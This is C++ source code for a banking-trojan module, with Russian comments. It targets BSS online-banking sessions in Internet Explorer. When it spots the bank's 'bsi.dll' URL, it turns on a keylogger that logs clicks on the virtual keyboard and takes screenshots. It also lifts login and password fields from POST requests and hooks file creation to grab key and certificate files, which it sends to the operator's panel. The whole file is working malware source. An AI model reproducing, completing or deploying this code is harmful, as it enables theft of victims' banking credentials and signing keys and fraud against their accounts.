
#include <shlobj.h>
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "KeyLogSystems.h"
#include "FileGrabber.h"
#include "BotHTTP.h"


//#include "BotDebug.h"

namespace DBGBSSWEB
{
	#include "DbgTemplates.h"
}

#define DBGBSS DBGBSSWEB::DBGOutMessage<>

#define BSSWebModule //говорим что модуль включен

namespace BSSWeb
{

    const static char BSS_SystemName[] = "bss";
	const static char BSS_DllName[]    = "bsi.dll";



    string *WorkHost;  // Имя домена для определения передачи файлов


	bool SystemAdded = false;
	PKeyLogSystem System = 0;
	PList hashKeys = 0; //список ключей которые уже сохранили
	CRITICAL_SECTION csHashKeys;

	//true - если файл является файлом ключем, а также отсылает его в админку
	int IsFileKey( FileGrabber::ParamEvent* e )
	{
		if( e->data )
		{
			DWORD hash = 0;
			int lenExt = 0; //длина расширения
			if( e->extFile )
			{
				hash = STR::GetHash( (char*)e->extFile, 0, true );
				lenExt = m_lstrlen(e->extFile);
			}
			if( lenExt <= 3 && hash != 0x1D36F0 /* tmp */ && hash != 0x1AB867 /* jpg */ && hash != 0x1CF4E7 /* sig */ &&
				hash != 0x1D3C74 /* txt */ && hash != 0x1A71EF /* ico */ && hash != 0x1C3767 /* png */)
			{
				//смотрим добавляли ли уже найденный ключ
				DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
				bool exists = true;
				pEnterCriticalSection(&csHashKeys);
				if( List::IndexOf( hashKeys, (LPVOID)hashFile ) < 0 )
				{
					List::Add( hashKeys, (LPVOID)hashFile );
					exists = false;
				}
				pLeaveCriticalSection(&csHashKeys);
				if( !exists )
				{
					//ищем символ : разделитель диска
					const char* p = e->fileName;
					while( *p && *p != ':' ) p++;
					if( *p == 0 ) //диска нет, значит скорее всего сетевая папка
						p = e->fileName;
					else
						p++; //обходим :
					//игнорируем начальные слеши 
					while( *p == '\\' || *p == '/' ) p++;
					//формируем имя файла для архива
					m_lstrcpy( e->nameSend, "keys\\" );
					m_lstrcat( e->nameSend, p );
					return FileGrabber::SENDFILE;
				}
			}
		}
		return 0;
	}

	void Activeted(LPVOID Sender)
	{
		DBGBSS( "BSS", "Activeted" );

		hashKeys = List::Create();
		pInitializeCriticalSection(&csHashKeys);

		FileGrabber::Init(FileGrabber::CREATEFILEA /*| FileGrabber::CREATEFILEW*/ );
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = IsFileKey;
		rv->minSize = 16;
		rv->maxSize = 2560;
		rv->aw |= FileGrabber::LOADFILE | FileGrabber::FILEISBIN | FileGrabber::FILEISBASE64;
		rv->maska = "-BEGIN CERTIFICATE-*-END CERTIFICATE-";
		const char gifFormat[] = { 'G', 'I', 'F', 0 };
		const char pngFormat[] = { 0x89, 'P', 'N', 'G', 0 };
		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //игнорируем формат gif
		FileGrabber::AddIgnoreBeg( rv, pngFormat ); //игнорируем формат png

		FileGrabber::AddReceiver(rv);

		System = (PKeyLogSystem)Sender;
	}

	void Deactiveted(LPVOID Sender)
	{
		DBGBSS( "BSS", "Deactiveted" );
		if( System )
		{
			FileGrabber::Release();
			List::Free(hashKeys);
			System = 0;
		}
	}

	//------------------------------------------------------------------------

	BOOL CALLBACK __CheckVKeyboardWnd(HWND Wnd, LPARAM FlagsPtr)
	{
		PCHAR Text = GetWndText(Wnd);
		if (Text == NULL)
			return TRUE;


		PDWORD Flags = (PDWORD)FlagsPtr;

		// Получаем хэш текста
		DWORD Hash = CalcHash(Text);
		STR::Free(Text);

		if (Hash == 0xBDD8F46E /* Логин */)
			*Flags |= 1;
		else
		if (Hash == 0xF1E44B82 /* Пароль */)
			*Flags |= 2;



		// Будем продолжать поиск до тех пор пока не найдём
		// нужные окна
        return *Flags != 3;
	}
	//------------------------------------------------------------------------

	void WndIsVirtualKeyboard(LPVOID Sender, HWND Wnd, LPVOID Data, bool &Filtrated)
	{
		// Функция проверяет является ли окно окном
		// виртуальной клавиатуры
		DWORD Flags = 0;

		pEnumChildWindows(Wnd, __CheckVKeyboardWnd, (LPARAM)&Flags);

        Filtrated = Flags == 3;
	}
	//------------------------------------------------------------------------

	//запуск кейлогера
	void InitKeyLogger()
	{
		DBGBSS( "BSS", "Инициализируем систему" );

		PKeyLogSystem S = KeyLogger::AddSystem(BSS_SystemName, PROCESS_HASH_IE);
		if( S != NULL )
		{
			SystemAdded = true;

			S->SendLogAsCAB = true;
			// Устанавливаем режим работы в одном фильтре и не меньше указанного
			// времени

			S->TimeMode    = KLG_TIME_MIN;
			S->TimeValue   = 5 * 60; // Система будет работать немение 5-ти минут
			S->MakeScreenShot = true;
			hashKeys = 0;

			S->OnActivate   = Activeted;
			S->OnDeactivate = Deactiveted;

			PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "Internet Explorer_Server", NULL, FILTRATE_SELF_WND, LOG_KEYBOARD, 5);
			F->LogClicks = true;
			F->MakeScreenShot = true;

			// Добавляем фильтр цифровой клавиатуры
			F = KeyLogger::AddFilter(S, true, false, "obj_STATIC", NULL, FILTRATE_PARENT_WND, LOG_MOUSE, 7);
			if (F != NULL)
				F->OnFiltrate = WndIsVirtualKeyboard;


			KeyLogger::ActivateSystem(S);
		}
	}
   	//------------------------------------------------------------------------

	void ProcessPostData(PHTTPRequestData Data)
	{
		// Обрабатываем пост запрос
		if (Data->PostData == NULL)
			return;

		PCHAR Tmp = Data->PostData;
		PCHAR Login		= GetTextBetween(Tmp,  "<L>", "</L>" );
		PCHAR Password	= GetTextBetween(Tmp,  "<P>", "</P>" );

		if (Login != NULL && Password != NULL)
		{
        	PCHAR LB = "\r\n";
			PCHAR Buf = STR::New(11, LB, LB, "URL:", Data->URL, LB, "Login:", Login, LB, "Password:", Password, LB);

			KeyLogger::AddStrToBuffer((HWND)-1, Buf, 0);

            DBGBSS( "BSS", "Добавляем данные запроса %s", Buf);

			STR::Free(Buf);
		}
		STR::Free(Login);
		STR::Free(Password);

    }

	//------------------------------------------------------------------------
	void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{
		PCHAR URL = NULL;


		switch (EventID)
		{
			case KLE_IE_URL_CHANGED:        URL = (char*)Data; break;
			case KLE_INTERNET_WRITE_FILE:   URL = ((PHTTPRequestData)Data)->URL;
		}

		bool IsBSS = m_strstr(URL, BSS_DllName) > 0;

		//  Добавляем систему
		if (!SystemAdded && IsBSS)
		{
        	DBGBSS( "BSS", "URL %s", URL );
			InitKeyLogger();
		}

		// От ключаем систему, если юзер находится на другой вкладке
		if (SystemAdded)
		{
			PKeyLogSystem S = KeyLogger::SystemByName(BSS_SystemName);

			if (S == NULL) return;

			switch (EventID)
			{
				case KLE_IE_URL_CHANGED:        S->Enabled = IsBSS; break;

				case KLE_INTERNET_WRITE_FILE:
					{
						// Перехватываем пост данные
						KeyLogger::ActivateSystem(S);
						ProcessPostData((PHTTPRequestData)Data);
					}
			}
		}
	}

	//------------------------------------------------------------------------




	void Init()
	{
		//Устанавливаем событие на смену урла в ИЕ
		SystemAdded = false;
		WorkHost = NULL;
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::ConnectEventHandler(KLE_INTERNET_WRITE_FILE, IEURLChanged);
	}
}



//----------------------------------------------------------------------------
//  Временный код, который складывает все файлы удовлетворяющие маске бсс
//----------------------------------------------------------------------------

bool IsBSSDocument(PCHAR URL)
{
	if (BSSWeb::WorkHost == NULL)
		return false;


	return STR::Pos(URL, BSSWeb::WorkHost->t_str()) >= 0;
}


void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
{
	// Проверяем маску

	bool IsBSS = STR::Pos(aURL, (PCHAR)BSSWeb::BSS_DllName) >= 0;

	if (!IsBSS && !IsBSSDocument(aURL))
	{
    	// не интересующий нас документ
        return;
    }


    TURLREC  URL;
	ClearStruct(URL);
	ParseURL(aURL, &URL, true);


	if (IsBSS)
	{
		// Запоминаем домен, для которого записывать данные
		if (BSSWeb::WorkHost != NULL)
			delete BSSWeb::WorkHost;
		BSSWeb::WorkHost = new string(URL.Host);
    }


	// Определяем каталог хранения
	string Path(MAX_PATH);

	pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE);

	Path.CalcLength();  // Рассмотреть целесообразность такого подхода

	Path += "\\BSS.V1\\";
	CreateDirectoryA(Path.t_str(), NULL);

	// Определяем имя файла
	string FileName = Path + URL.Document;

	// Записываем данные
	File::WriteBufferA(FileName.t_str(), Data, DataSize);


	ClearURL(&URL);
}
